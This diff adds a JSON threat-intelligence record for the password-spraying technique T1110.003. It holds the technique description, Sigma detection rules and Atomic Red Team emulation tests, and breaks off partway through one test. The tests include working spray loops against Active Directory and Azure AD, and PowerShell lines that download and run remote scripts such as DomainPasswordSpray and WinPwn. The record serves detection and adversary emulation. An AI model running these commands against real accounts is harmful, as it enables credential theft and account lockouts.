@@ -1,0 +1,389 @@
+{
+    "id": "T1110.003",
+    "name": "Password Spraying",
+    "description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
+    "platforms": "Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers",
+    "kill_chain_phases": "Credential Access",
+    "data_sources": "User Account: User Account Authentication, Application Log: Application Log Content",
+    "detection": "Monitor authentication logs for system and application login failures of [Valid Accounts](T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.\nConsider the following event IDs:(Citation: Trimarc Detecting Password Spraying)\n* Domain Controllers: \"Audit Logon\" (Success & Failure) for event ID 4625.\n* Domain Controllers: \"Audit Kerberos Authentication Service\" (Success & Failure) for event ID 4771.\n* All systems: \"Audit Logon\" (Success & Failure) for event ID 4648.",
+    "url": "https://attack.mitre.org/techniques/T1110/003",
+    "enrichments": {
+        "attack_rule_map": [],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "56d62ef8-3462-4890-9859-7b41e541f8d5",
+                    "4b6fe998-b69c-46d8-901b-13677c9fb663",
+                    "fe563ab6-ded4-4916-b49f-a3a8445fe280",
+                    "add2ef8d-dc91-4002-9e7e-f2702369f53a",
+                    "5d1d946e-32e6-4d9a-a0dc-0ac022c7eb98",
+                    "f88bab7f-b1f4-41bb-bdb1-4b8af35b0470",
+                    "bc93dfe6-8242-411e-a2dd-d16fa0cc8564",
+                    "692074ae-bb62-4a5e-a735-02cb6bde458c",
+                    "196a29c2-e378-48d8-ba07-8a9e61f7fab9"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "56d62ef8-3462-4890-9859-7b41e541f8d5",
+                        "lookup_data": {
+                            "description": "Detects failed logins with multiple invalid domain accounts from a single source system using the NTLM protocol.",
+                            "raw": "author: Mauricio Velazco\ndate: 2021/06/01\ndescription: Detects failed logins with multiple invalid domain accounts from a single\n  source system using the NTLM protocol.\ndetection:\n  condition:\n  - selection1 and not filter | count(TargetUserName) by Workstation > 10\n  filter:\n    TargetUserName: '*$'\n  selection1:\n    EventID: 4776\n    Status: '*0xC0000064'\n  timeframe: 24h\nfalsepositives:\n- Terminal servers\n- Jump servers\n- Other multiuser systems like Citrix server farms\n- Workstations with frequently changing users\nid: 56d62ef8-3462-4890-9859-7b41e541f8d5\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying\nstatus: test\ntags:\n- attack.t1110.003\n- attack.initial_access\n- attack.privilege_escalation\ntitle: Invalid Users Failing To Authenticate From Single Source Using NTLM\n",
+                            "sigma:id": "56d62ef8-3462-4890-9859-7b41e541f8d5",
+                            "title": "Invalid Users Failing To Authenticate From Single Source Using NTLM",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4b6fe998-b69c-46d8-901b-13677c9fb663",
+                        "lookup_data": {
+                            "description": "Detects failed logins with multiple disabled domain accounts from a single source system using the Kerberos protocol.",
+                            "raw": "author: Mauricio Velazco, frack113\ndate: 2021/06/01\ndescription: Detects failed logins with multiple disabled domain accounts from a single\n  source system using the Kerberos protocol.\ndetection:\n  condition:\n  - selection and not filter_computer | count(TargetUserName) by IpAddress > 10\n  filter_computer:\n    TargetUserName|endswith: $\n  selection:\n    EventID: 4768\n    Status: '0x12'\n  timeframe: 24h\nfalsepositives:\n- Vulnerability scanners\n- Misconfigured systems\n- Remote administration tools\n- VPN terminators\n- Multiuser systems like Citrix server farms\nid: 4b6fe998-b69c-46d8-901b-13677c9fb663\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying\nstatus: test\ntags:\n- attack.t1110.003\n- attack.initial_access\n- attack.privilege_escalation\ntitle: Disabled Users Failing To Authenticate From Source Using Kerberos\n",
+                            "sigma:id": "4b6fe998-b69c-46d8-901b-13677c9fb663",
+                            "title": "Disabled Users Failing To Authenticate From Source Using Kerberos",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "fe563ab6-ded4-4916-b49f-a3a8445fe280",
+                        "lookup_data": {
+                            "description": "Detects failed logins with multiple accounts from a single process on the system.",
+                            "raw": "author: Mauricio Velazco\ndate: 2021/06/01\ndescription: Detects failed logins with multiple accounts from a single process on\n  the system.\ndetection:\n  condition:\n  - selection1 and not filter | count(TargetUserName) by ProcessName > 10\n  filter:\n    ProcessName: '-'\n  selection1:\n    EventID: 4625\n    LogonType: 2\n  timeframe: 24h\nfalsepositives:\n- Terminal servers\n- Jump servers\n- Other multiuser systems like Citrix server farms\n- Workstations with frequently changing users\nid: fe563ab6-ded4-4916-b49f-a3a8445fe280\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying\n- https://www.trimarcsecurity.com/single-post/2018/05/06/trimarc-research-detecting-password-spraying-with-security-event-auditing\nstatus: test\ntags:\n- attack.t1110.003\n- attack.initial_access\n- attack.privilege_escalation\ntitle: Multiple Users Failing to Authenticate from Single Process\n",
+                            "sigma:id": "fe563ab6-ded4-4916-b49f-a3a8445fe280",
+                            "title": "Multiple Users Failing to Authenticate from Single Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "add2ef8d-dc91-4002-9e7e-f2702369f53a",
+                        "lookup_data": {
+                            "description": "Detects a source system failing to authenticate against a remote host with multiple users.",
+                            "raw": "author: Mauricio Velazco\ndate: 2021/06/01\ndescription: Detects a source system failing to authenticate against a remote host\n  with multiple users.\ndetection:\n  condition: selection1 and not filter | count(TargetUserName) by IpAddress > 10\n  filter:\n    IpAddress: '-'\n  selection1:\n    EventID: 4625\n    LogonType: 3\n  timeframe: 24h\nfalsepositives:\n- Terminal servers\n- Jump servers\n- Other multiuser systems like Citrix server farms\n- Workstations with frequently changing users\nid: add2ef8d-dc91-4002-9e7e-f2702369f53a\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying\nstatus: test\ntags:\n- attack.t1110.003\n- attack.initial_access\n- attack.privilege_escalation\ntitle: Multiple Users Remotely Failing To Authenticate From Single Source\n",
+                            "sigma:id": "add2ef8d-dc91-4002-9e7e-f2702369f53a",
+                            "title": "Multiple Users Remotely Failing To Authenticate From Single Source",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5d1d946e-32e6-4d9a-a0dc-0ac022c7eb98",
+                        "lookup_data": {
+                            "description": "Detects multiple failed logins with multiple valid domain accounts from a single source system using the Kerberos protocol.",
+                            "raw": "author: Mauricio Velazco, frack113\ndate: 2021/06/01\ndescription: Detects multiple failed logins with multiple valid domain accounts from\n  a single source system using the Kerberos protocol.\ndetection:\n  condition:\n  - selection and not filter_computer | count(TargetUserName) by IpAddress > 10\n  filter_computer:\n    TargetUserName|endswith: $\n  selection:\n    EventID: 4771\n    Status: '0x18'\n  timeframe: 24h\nfalsepositives:\n- Vulnerability scanners\n- Misconfigured systems\n- Remote administration tools\n- VPN terminators\n- Multiuser systems like Citrix server farms\nid: 5d1d946e-32e6-4d9a-a0dc-0ac022c7eb98\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying\nstatus: test\ntags:\n- attack.t1110.003\n- attack.initial_access\n- attack.privilege_escalation\ntitle: Valid Users Failing to Authenticate From Single Source Using Kerberos\n",
+                            "sigma:id": "5d1d946e-32e6-4d9a-a0dc-0ac022c7eb98",
+                            "title": "Valid Users Failing to Authenticate From Single Source Using Kerberos",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f88bab7f-b1f4-41bb-bdb1-4b8af35b0470",
+                        "lookup_data": {
+                            "description": "Detects failed logins with multiple valid domain accounts from a single source system using the NTLM protocol.",
+                            "raw": "author: Mauricio Velazco\ndate: 2021/06/01\ndescription: Detects failed logins with multiple valid domain accounts from a single\n  source system using the NTLM protocol.\ndetection:\n  condition:\n  - selection1 and not filter | count(TargetUserName) by Workstation > 10\n  filter:\n    TargetUserName: '*$'\n  selection1:\n    EventID: 4776\n    Status: '*0xC000006A'\n  timeframe: 24h\nfalsepositives:\n- Terminal servers\n- Jump servers\n- Other multiuser systems like Citrix server farms\n- Workstations with frequently changing users\nid: f88bab7f-b1f4-41bb-bdb1-4b8af35b0470\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying\nstatus: test\ntags:\n- attack.t1110.003\n- attack.initial_access\n- attack.privilege_escalation\ntitle: Valid Users Failing to Authenticate from Single Source Using NTLM\n",
+                            "sigma:id": "f88bab7f-b1f4-41bb-bdb1-4b8af35b0470",
+                            "title": "Valid Users Failing to Authenticate from Single Source Using NTLM",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bc93dfe6-8242-411e-a2dd-d16fa0cc8564",
+                        "lookup_data": {
+                            "description": "Detects failed logins with multiple invalid domain accounts from a single source system using the Kerberos protocol.",
+                            "raw": "author: Mauricio Velazco, frack113\ndate: 2021/06/01\ndescription: Detects failed logins with multiple invalid domain accounts from a single\n  source system using the Kerberos protocol.\ndetection:\n  condition:\n  - selection and not filter_computer | count(TargetUserName) by IpAddress > 10\n  filter_computer:\n    TargetUserName|endswith: $\n  selection:\n    EventID: 4768\n    Status: '0x6'\n  timeframe: 24h\nfalsepositives:\n- Vulnerability scanners\n- Misconfigured systems\n- Remote administration tools\n- VPN terminators\n- Multiuser systems like Citrix server farms\nid: bc93dfe6-8242-411e-a2dd-d16fa0cc8564\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying\nstatus: test\ntags:\n- attack.t1110.003\n- attack.initial_access\n- attack.privilege_escalation\ntitle: Invalid Users Failing To Authenticate From Source Using Kerberos\n",
+                            "sigma:id": "bc93dfe6-8242-411e-a2dd-d16fa0cc8564",
+                            "title": "Invalid Users Failing To Authenticate From Source Using Kerberos",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "692074ae-bb62-4a5e-a735-02cb6bde458c",
+                        "lookup_data": {
+                            "capec": "CAPEC-565",
+                            "mitre-attack-id": "T1110.003",
+                            "mitre-cti:description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
+                            "mitre-cti:name": "Password Spraying",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Microsoft Threat Intelligence Center (MSTIC)', 'John Strand'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c', 'type': 'attack-pattern', 'created': '2020-02-11T18:39:25.122Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1110.003', 'url': 'https://attack.mitre.org/techniques/T1110/003'}, {'external_id': 'CAPEC-565', 'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/565.html'}, {'url': 'http://www.blackhillsinfosec.com/?p=4645', 'description': 'Thyer, J. (2015, October 30). Password Spraying & Other Fun with RPCCLIENT. Retrieved April 25, 2017.', 'source_name': 'BlackHillsInfosec Password Spraying'}, {'source_name': 'US-CERT TA18-068A 2018', 'url': 'https://www.us-cert.gov/ncas/alerts/TA18-086A', 'description': 'US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.'}, {'source_name': 'Trimarc Detecting Password Spraying', 'url': 'https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing', 'description': 'Metcalf, S. (2018, May 6). Trimarc Research: Detecting Password Spraying with Security Event Auditing. Retrieved January 16, 2019.'}], 'modified': '2021-04-06T12:32:47.678Z', 'name': 'Password Spraying', 'description': 'Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. \\'Password01\\'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\\n\\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\\n\\n* SSH (22/TCP)\\n* Telnet (23/TCP)\\n* FTP (21/TCP)\\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\\n* LDAP (389/TCP)\\n* Kerberos (88/TCP)\\n* RDP / Terminal Services (3389/TCP)\\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\\n* MSSQL (1433/TCP)\\n* Oracle (1521/TCP)\\n* MySQL (3306/TCP)\\n* VNC (5900/TCP)\\n\\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\\n\\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.\\n\\nConsider the following event IDs:(Citation: Trimarc Detecting Password Spraying)\\n\\n* Domain Controllers: \"Audit Logon\" (Success & Failure) for event ID 4625.\\n* Domain Controllers: \"Audit Kerberos Authentication Service\" (Success & Failure) for event ID 4771.\\n* All systems: \"Audit Logon\" (Success & Failure) for event ID 4648.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.2', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Application Log: Application Log Content', 'User Account: User Account Authentication'], 'x_mitre_permissions_required': ['User']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "196a29c2-e378-48d8-ba07-8a9e61f7fab9",
+                        "lookup_data": {
+                            "description": "Detects a single user failing to authenticate to multiple users using explicit credentials.",
+                            "raw": "author: Mauricio Velazco, Zach Mathis\ndate: 2021/06/01\ndescription: Detects a single user failing to authenticate to multiple users using\n  explicit credentials.\ndetection:\n  condition: selection and not filter | count(TargetUserName) by SubjectUserName >\n    10\n  filter:\n    SubjectUserName|endswith: $\n  selection:\n    EventID: 4648\n  timeframe: 1h\nfalsepositives:\n- Terminal servers\n- Jump servers\n- Other multiuser systems like Citrix server farms\n- Workstations with frequently changing users\nid: 196a29c2-e378-48d8-ba07-8a9e61f7fab9\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2023/01/27\nreferences:\n- https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying\nstatus: test\ntags:\n- attack.t1110.003\n- attack.initial_access\n- attack.privilege_escalation\ntitle: Password Spraying via Explicit Credentials\n",
+                            "sigma:id": "196a29c2-e378-48d8-ba07-8a9e61f7fab9",
+                            "title": "Password Spraying via Explicit Credentials",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1110.003",
+                "display_name": "Brute Force: Password Spraying",
+                "atomic_tests": [
+                    {
+                        "name": "Password Spray all Domain Users",
+                        "auto_generated_guid": "90bc2e54-6c84-47a5-9439-0a2a92b4b175",
+                        "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "password": {
+                                "description": "The password to try for each user in users.txt",
+                                "type": "string",
+                                "default": "Spring2020"
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "List of domain users to password spray must exits at %temp%\\users.txt\n",
+                                "prereq_command": "if not exist %temp%\\users.txt (exit /b 1)\n",
+                                "get_prereq_command": "\"PathToAtomicsFolder\\T1110.003\\src\\parse_net_users.bat\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": false,
+                            "command": "@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL\n"
+                        }
+                    },
+                    {
+                        "name": "Password Spray (DomainPasswordSpray)",
+                        "auto_generated_guid": "263ae743-515f-4786-ac7d-41ef3a0d4b2b",
+                        "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "domain": {
+                                "description": "Domain to brute force against",
+                                "type": "string",
+                                "default": "$Env:USERDOMAIN"
+                            }
+                        },
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force\n"
+                        }
+                    },
+                    {
+                        "name": "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)",
+                        "auto_generated_guid": "f14d956a-5b6e-4a93-847f-0c415142f07d",
+                        "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "password": {
+                                "description": "single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
+                                "type": "string",
+                                "default": "P@ssw0rd!"
+                            },
+                            "domain": {
+                                "description": "Domain FQDN",
+                                "type": "string",
+                                "default": "$env:UserDnsDomain"
+                            },
+                            "auth": {
+                                "description": "authentication method to choose between \"NTLM\" and \"Kerberos\"",
+                                "type": "string",
+                                "default": "NTLM"
+                            }
+                        },
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = '#{password}'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"\n"
+                        }
+                    },
+                    {
+                        "name": "Password spray all Azure AD users with a single password",
+                        "auto_generated_guid": "a8aa2d3e-1c52-4016-bc73-0f8854cfa80a",
+                        "description": "Attempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.\n",
+                        "supported_platforms": [
+                            "azure-ad"
+                        ],
+                        "input_arguments": {
+                            "password": {
+                                "description": "Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
+                                "type": "string",
+                                "default": "P@ssw0rd!"
+                            },
+                            "valid_username": {
+                                "description": "Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>",
+                                "type": "string",
+                                "default": "bruce.wayne@contoso.com"
+                            },
+                            "valid_password": {
+                                "description": "Valid password to authenticate as valid_username in the <valid_ms_account>",
+                                "type": "string",
+                                "default": "iamthebatman"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "AzureAD module must be installed.\n",
+                                "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
+                                "get_prereq_command": "Install-Module -Name AzureAD -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n($Users = Get-AzureADUser -All $true) > $null\nDisconnect-AzureAD > $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD > $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"\n"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - DomainPasswordSpray Attacks",
+                        "auto_generated_guid": "5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82",
+                        "description": "DomainPasswordSpray Attacks technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndomainpassspray -consoleoutput -noninteractive -emptypasswords",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Password Spray Invoke-DomainPasswordSpray Light",
+                        "auto_generated_guid": "b15bc9a5-a4f3-4879-9304-ea0011ace63a",
+                        "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "user_limit": {
+                                "description": "The max number of users to put in the list when running the prereq_command",
+                                "type": "integer",
+                                "default": 200
+                            },
+                            "password": {
+                                "description": "The password to try for each user in users.txt",
+                                "type": "string",
+                                "default": "Spring2020"
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
+                                "prereq_command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Write-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n"
+                        }
+                    },
+                    {
+                        "name": "Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)",
+                        "auto_generated_guid": "f3a10056-0160-4785-8744-d9bd7c12dc39",
+                        "description": "This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.\n",
+                        "supported_platforms": [
+                            "azure-ad"
+                        ],
+                        "input_arguments": {
+                            "password": {
+                                "description": "Single password to try against the list of user accounts",
+                                "type": "string",
+                                "default": "P@ssword1"
+                            },
+                            "user_list": {
+                                "description": "File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)",
+                                "type": "string",
+                                "default": "$env:temp\\T1110.003UserList.txt"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "MSOLSpray module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
+                                "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"){exit 0} else {exit 1}\n",
